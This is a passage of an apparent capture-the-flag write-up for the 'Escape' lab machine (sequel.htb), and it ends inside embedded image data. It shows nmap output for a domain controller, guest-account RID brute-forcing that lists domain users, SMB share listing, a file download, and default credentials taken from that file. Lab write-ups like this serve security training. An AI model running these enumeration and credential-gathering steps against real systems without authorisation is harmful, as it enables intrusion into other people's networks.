+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-02 08:08:34Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
+| Not valid before: 2024-01-18T23:03:57
+|_Not valid after:  2074-01-05T23:03:57
+|_ssl-date: 2026-02-02T08:10:10+00:00; +8h00m00s from scanner time.
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
+| Not valid before: 2024-01-18T23:03:57
+|_Not valid after:  2074-01-05T23:03:57
+|_ssl-date: 2026-02-02T08:10:11+00:00; +8h00m00s from scanner time.
+1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
+| ms-sql-ntlm-info: 
+|   10.129.228.253:1433: 
+|     Target_Name: sequel
+|     NetBIOS_Domain_Name: sequel
+|     NetBIOS_Computer_Name: DC
+|     DNS_Domain_Name: sequel.htb
+|     DNS_Computer_Name: dc.sequel.htb
+|     DNS_Tree_Name: sequel.htb
+|_    Product_Version: 10.0.17763
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2026-02-02T08:04:06
+|_Not valid after:  2056-02-02T08:04:06
+| ms-sql-info: 
+|   10.129.228.253:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+|_ssl-date: 2026-02-02T08:10:10+00:00; +8h00m00s from scanner time.
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
+| Not valid before: 2024-01-18T23:03:57
+|_Not valid after:  2074-01-05T23:03:57
+|_ssl-date: 2026-02-02T08:10:10+00:00; +8h00m00s from scanner time.
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
+|_ssl-date: 2026-02-02T08:10:11+00:00; +8h00m00s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
+| Not valid before: 2024-01-18T23:03:57
+|_Not valid after:  2074-01-05T23:03:57
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49667/tcp open  msrpc         Microsoft Windows RPC
+49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49690/tcp open  msrpc         Microsoft Windows RPC
+49711/tcp open  msrpc         Microsoft Windows RPC
+49721/tcp open  msrpc         Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
+OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
+Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2026-02-02T08:09:34
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s
+
+TRACEROUTE (using port 445/tcp)
+HOP RTT      ADDRESS
+1   13.11 ms 10.10.14.1
+2   13.31 ms 10.129.228.253
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 299.03 seconds</code></pre></div>
+<p>The domain name is <code class="inline-code">sequel.htb</code>:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/VPNs]
+&boxur;&boxh;$ nxc smb 10.129.228.253                                   
+SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:None) (Null Auth:True)</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~<span class="hljs-regexp">/Desktop/</span>VPNs]
+&boxur;&boxh;$ nxc smb <span class="hljs-number">10.129</span><span class="hljs-number">.228</span><span class="hljs-number">.253</span>                                   
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.228</span><span class="hljs-number">.253</span>  <span class="hljs-number">445</span>    DC               [*] Windows <span class="hljs-number">10</span> / Server <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> x64 (name:DC) (<span class="hljs-built_in">domain</span>:sequel.htb) (signing:<span class="hljs-literal">True</span>) (SMBv1:<span class="hljs-built_in">None</span>) (<span class="hljs-literal">Null</span> Auth:<span class="hljs-literal">True</span>)</code></pre></div>
+<p>Guest authentication is allowed which can be used for enumeration:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/VPNs]
+&boxur;&boxh;$ nxc smb 10.129.228.253 -u &apos;guest&apos; -p &apos;&apos; --rid-brute 10000 
+SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.228.253  445    DC               [+] sequel.htb\guest: 
+SMB         10.129.228.253  445    DC               498: sequel\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB         10.129.228.253  445    DC               500: sequel\Administrator (SidTypeUser)
+SMB         10.129.228.253  445    DC               501: sequel\Guest (SidTypeUser)
+SMB         10.129.228.253  445    DC               502: sequel\krbtgt (SidTypeUser)
+SMB         10.129.228.253  445    DC               512: sequel\Domain Admins (SidTypeGroup)
+SMB         10.129.228.253  445    DC               513: sequel\Domain Users (SidTypeGroup)
+SMB         10.129.228.253  445    DC               514: sequel\Domain Guests (SidTypeGroup)
+SMB         10.129.228.253  445    DC               515: sequel\Domain Computers (SidTypeGroup)
+SMB         10.129.228.253  445    DC               516: sequel\Domain Controllers (SidTypeGroup)
+SMB         10.129.228.253  445    DC               517: sequel\Cert Publishers (SidTypeAlias)
+SMB         10.129.228.253  445    DC               518: sequel\Schema Admins (SidTypeGroup)
+SMB         10.129.228.253  445    DC               519: sequel\Enterprise Admins (SidTypeGroup)
+SMB         10.129.228.253  445    DC               520: sequel\Group Policy Creator Owners (SidTypeGroup)
+SMB         10.129.228.253  445    DC               521: sequel\Read-only Domain Controllers (SidTypeGroup)
+SMB         10.129.228.253  445    DC               522: sequel\Cloneable Domain Controllers (SidTypeGroup)
+SMB         10.129.228.253  445    DC               525: sequel\Protected Users (SidTypeGroup)
+SMB         10.129.228.253  445    DC               526: sequel\Key Admins (SidTypeGroup)
+SMB         10.129.228.253  445    DC               527: sequel\Enterprise Key Admins (SidTypeGroup)
+SMB         10.129.228.253  445    DC               553: sequel\RAS and IAS Servers (SidTypeAlias)
+SMB         10.129.228.253  445    DC               571: sequel\Allowed RODC Password Replication Group (SidTypeAlias)
+SMB         10.129.228.253  445    DC               572: sequel\Denied RODC Password Replication Group (SidTypeAlias)
+SMB         10.129.228.253  445    DC               1000: sequel\DC$ (SidTypeUser)
+SMB         10.129.228.253  445    DC               1101: sequel\DnsAdmins (SidTypeAlias)
+SMB         10.129.228.253  445    DC               1102: sequel\DnsUpdateProxy (SidTypeGroup)
+SMB         10.129.228.253  445    DC               1103: sequel\Tom.Henn (SidTypeUser)
+SMB         10.129.228.253  445    DC               1104: sequel\Brandon.Brown (SidTypeUser)
+SMB         10.129.228.253  445    DC               1105: sequel\Ryan.Cooper (SidTypeUser)
+SMB         10.129.228.253  445    DC               1106: sequel\sql_svc (SidTypeUser)
+SMB         10.129.228.253  445    DC               1107: sequel\James.Roberts (SidTypeUser)
+SMB         10.129.228.253  445    DC               1108: sequel\Nicole.Thompson (SidTypeUser)
+SMB         10.129.228.253  445    DC               1109: sequel\SQLServer2005SQLBrowserUser$DC (SidTypeAlias)</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/VPNs]
+&boxur;&boxh;$ nxc smb 10.129.228.253 -u &apos;guest&apos; -p &apos;&apos; --rid-brute 10000 
+SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.228.253  445    DC               [+] sequel.htb\guest: 
+SMB         10.129.228.253  445    DC               498: sequel\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB         10.129.228.253  445    DC               500: sequel\Administrator (SidTypeUser)
+SMB         10.129.228.253  445    DC               501: sequel\Guest (SidTypeUser)
+SMB         10.129.228.253  445    DC               502: sequel\krbtgt (SidTypeUser)
+SMB         10.129.228.253  445    DC               512: sequel\Domain Admins (SidTypeGroup)
+SMB         10.129.228.253  445    DC               513: sequel\Domain Users (SidTypeGroup)
+SMB         10.129.228.253  445    DC               514: sequel\Domain Guests (SidTypeGroup)
+SMB         10.129.228.253  445    DC               515: sequel\Domain Computers (SidTypeGroup)
+SMB         10.129.228.253  445    DC               516: sequel\Domain Controllers (SidTypeGroup)
+SMB         10.129.228.253  445    DC               517: sequel\Cert Publishers (SidTypeAlias)
+SMB         10.129.228.253  445    DC               518: sequel\Schema Admins (SidTypeGroup)
+SMB         10.129.228.253  445    DC               519: sequel\Enterprise Admins (SidTypeGroup)
+SMB         10.129.228.253  445    DC               520: sequel\Group Policy Creator Owners (SidTypeGroup)
+SMB         10.129.228.253  445    DC               521: sequel\Read-only Domain Controllers (SidTypeGroup)
+SMB         10.129.228.253  445    DC               522: sequel\Cloneable Domain Controllers (SidTypeGroup)
+SMB         10.129.228.253  445    DC               525: sequel\Protected Users (SidTypeGroup)
+SMB         10.129.228.253  445    DC               526: sequel\Key Admins (SidTypeGroup)
+SMB         10.129.228.253  445    DC               527: sequel\Enterprise Key Admins (SidTypeGroup)
+SMB         10.129.228.253  445    DC               553: sequel\RAS and IAS Servers (SidTypeAlias)
+SMB         10.129.228.253  445    DC               571: sequel\Allowed RODC Password Replication Group (SidTypeAlias)
+SMB         10.129.228.253  445    DC               572: sequel\Denied RODC Password Replication Group (SidTypeAlias)
+SMB         10.129.228.253  445    DC               1000: sequel\DC$ (SidTypeUser)
+SMB         10.129.228.253  445    DC               1101: sequel\DnsAdmins (SidTypeAlias)
+SMB         10.129.228.253  445    DC               1102: sequel\DnsUpdateProxy (SidTypeGroup)
+SMB         10.129.228.253  445    DC               1103: sequel\Tom.Henn (SidTypeUser)
+SMB         10.129.228.253  445    DC               1104: sequel\Brandon.Brown (SidTypeUser)
+SMB         10.129.228.253  445    DC               1105: sequel\Ryan.Cooper (SidTypeUser)
+SMB         10.129.228.253  445    DC               1106: sequel\sql_svc (SidTypeUser)
+SMB         10.129.228.253  445    DC               1107: sequel\James.Roberts (SidTypeUser)
+SMB         10.129.228.253  445    DC               1108: sequel\Nicole.Thompson (SidTypeUser)
+SMB         10.129.228.253  445    DC               1109: sequel\SQLServer2005SQLBrowserUser$DC (SidTypeAlias)</code></pre></div>
+<p>There is a share called <code class="inline-code">Public</code> where we have <code class="inline-code">READ</code> privileges:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Escape]
+&boxur;&boxh;$ nxc smb 10.129.228.253 -u &apos;guest&apos; -p &apos;&apos; --shares      
+SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.228.253  445    DC               [+] sequel.htb\guest: 
+SMB         10.129.228.253  445    DC               [*] Enumerated shares
+SMB         10.129.228.253  445    DC               Share           Permissions     Remark
+SMB         10.129.228.253  445    DC               -----           -----------     ------
+SMB         10.129.228.253  445    DC               ADMIN$                          Remote Admin
+SMB         10.129.228.253  445    DC               C$                              Default share
+SMB         10.129.228.253  445    DC               IPC$            READ            Remote IPC
+SMB         10.129.228.253  445    DC               NETLOGON                        Logon server share 
+SMB         10.129.228.253  445    DC               Public          READ            
+SMB         10.129.228.253  445    DC               SYSVOL                          Logon server share</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Escape]
+&boxur;&boxh;$ nxc smb 10.129.228.253 -u &apos;guest&apos; -p &apos;&apos; --shares      
+SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.228.253  445    DC               [+] sequel.htb\guest: 
+SMB         10.129.228.253  445    DC               [*] Enumerated shares
+SMB         10.129.228.253  445    DC               Share           Permissions     Remark
+SMB         10.129.228.253  445    DC               -----           -----------     ------
+SMB         10.129.228.253  445    DC               ADMIN$                          Remote Admin
+SMB         10.129.228.253  445    DC               C$                              Default share
+SMB         10.129.228.253  445    DC               IPC$            READ            Remote IPC
+SMB         10.129.228.253  445    DC               NETLOGON                        Logon server share 
+SMB         10.129.228.253  445    DC               Public          READ            
+SMB         10.129.228.253  445    DC               SYSVOL                          Logon server share</code></pre></div>
+<p>Inside the <code class="inline-code">Public</code> share, there exists a file called <code class="inline-code">SQL Server Procedures.pdf</code>:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Escape]
+&boxur;&boxh;$ smbclient //sequel.htb/Public
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Sat Nov 19 06:51:25 2022
+  ..                                  D        0  Sat Nov 19 06:51:25 2022
+  SQL Server Procedures.pdf           A    49551  Fri Nov 18 08:39:43 2022
+
+        5184255 blocks of size 4096. 1440674 blocks available
+smb: \&gt; get &quot;SQL Server Procedures.pdf&quot;
+getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (768.1 KiloBytes/sec) (average 768.1 KiloBytes/sec)
+smb: \&gt; 
+smb: \&gt; exit</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~<span class="hljs-regexp">/Desktop/</span>Labs/Escape]
+&boxur;&boxh;$ smbclient <span class="hljs-regexp">//</span>sequel.htb/Public
+Try <span class="hljs-string">&quot;help&quot;</span> to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        <span class="hljs-number">0</span>  Sat Nov <span class="hljs-number">19</span> <span class="hljs-number">06</span>:<span class="hljs-number">51</span>:<span class="hljs-number">25</span> <span class="hljs-number">2022</span>
+  ..                                  D        <span class="hljs-number">0</span>  Sat Nov <span class="hljs-number">19</span> <span class="hljs-number">06</span>:<span class="hljs-number">51</span>:<span class="hljs-number">25</span> <span class="hljs-number">2022</span>
+  SQL Server Procedures.pdf           A    <span class="hljs-number">49551</span>  Fri Nov <span class="hljs-number">18</span> <span class="hljs-number">08</span>:<span class="hljs-number">39</span>:<span class="hljs-number">43</span> <span class="hljs-number">2022</span>
+
+        <span class="hljs-number">5184255</span> blocks of size <span class="hljs-number">4096</span>. <span class="hljs-number">1440674</span> blocks available
+smb: \&gt; get <span class="hljs-string">&quot;SQL Server Procedures.pdf&quot;</span>
+getting file \SQL Server Procedures.pdf of size <span class="hljs-number">49551</span> as SQL Server Procedures.pdf (<span class="hljs-number">768.1</span> KiloBytes<span class="hljs-regexp">/sec) (average 768.1 KiloBytes/</span>sec)
+smb: \&gt; 
+smb: \&gt; <span class="hljs-keyword">exit</span></code></pre></div>
+<p>When looking through the new document, I notice it has default credentials <code class="inline-code">PublicUser:GuestUserCantWrite1</code>:<br/>
+<img src="data:image/png;base64,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